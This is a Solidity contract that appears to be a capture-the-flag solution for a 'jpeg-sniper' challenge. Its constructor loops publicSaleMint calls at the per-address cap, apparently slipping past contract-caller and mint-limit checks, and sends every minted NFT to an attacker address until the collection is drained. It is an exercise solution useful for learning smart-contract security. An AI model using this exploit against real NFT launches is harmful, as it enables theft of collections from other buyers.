// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import {IERC721, FlatLaunchpeg} from "src/jpeg-sniper/FlatLaunchpeg.sol";

contract Solver {
    constructor(address _victim, address _attacker) {
        uint256 maxAmount = FlatLaunchpeg(_victim).maxPerAddressDuringMint(); //Getting the max amount a user can mint per transaction
        uint256 amount; 
        while (true) { //Loop until we minted all the NFT's
            try FlatLaunchpeg(_victim).publicSaleMint(maxAmount) { //Try to mint the max amount of NFT's per user
                amount = FlatLaunchpeg(_victim).totalSupply(); //Getting the total of NFT's minted
                for (uint256 i = amount - 5; i < amount; i++) { //For loop 5 times to transfer the last 5 minted NFT's to the attacker address
                    IERC721(_victim).transferFrom(address(this), _attacker, i);
                }
            } catch { // If not able to mint the max amount of NFT's, we can try to mint the remaining NFT's
                uint256 totalSupply = FlatLaunchpeg(_victim).collectionSize(); // Getting the total of NFT's in the collection
                amount = FlatLaunchpeg(_victim).totalSupply();   //Getting the total of NFT's minted
                uint256 remaining = totalSupply - amount; //Getting the remaining NFT's to mint
                FlatLaunchpeg(_victim).publicSaleMint(remaining); //Trying to mint the remaining NFT's
                for (uint256 i = amount; i < totalSupply; i++) { //For loop to transfer the remaining NFT's to the attacker address
                    IERC721(_victim).transferFrom(address(this), _attacker, i);
                }
                break; //Break the loop if we minted all the NFT's
            }
        }
    }
}
